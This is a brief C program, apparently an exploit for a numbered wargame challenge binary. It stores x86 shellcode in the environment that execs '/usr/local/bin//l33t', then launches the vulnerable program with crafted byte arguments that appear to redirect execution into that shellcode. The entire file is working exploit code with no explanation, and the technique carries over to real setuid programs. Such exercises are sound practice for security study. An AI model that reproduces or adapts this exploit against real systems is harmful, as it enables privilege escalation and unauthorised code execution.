#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define VULN "/var/challenge/level6/6"

char mc[] = "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6c\x33\x33\x74\x68\x69\x6e\x2f\x2f\x68\x61\x6c\x2f\x62\x68\x2f\x6c\x6f\x63\x68\x2f\x75\x73\x72\x89\xe3\xb0\x0b\xcd\x80";

int main()
{
	char *prm1 = "-1",
	     *prm2 = "\xb9 28",
	     *prm3 = "\xff 29",
	     *prm4 = "\xff 30",
	     *prm5 = "\xbf 31";
	char *prgwprm[] = {VULN, prm1, prm2, prm3, prm4, prm5, NULL};
	char *envp[] = {mc, NULL};

	execve(prgwprm[0], prgwprm, envp);
	return 0;
}
